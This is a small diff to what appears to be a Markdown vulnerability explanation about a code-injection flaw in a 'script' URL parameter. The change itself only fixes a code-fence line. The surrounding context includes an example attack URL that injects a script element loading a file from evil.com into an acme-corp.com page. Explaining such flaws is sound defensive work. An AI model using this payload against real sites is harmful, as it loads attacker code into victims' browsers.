@@ -159,8 +159,7 @@ if (dynamicCode) {
 3. **Complex attack:**
    ```
    https://acme-corp.com/app?script=var s=document.createElement('script');s.src='https://evil.com/malicious.js';document.body.appendChild(s);
-   
-```
+   ```
    This loads a full external malicious script, allowing for more complex attacks.
 
 **Technical Context:**
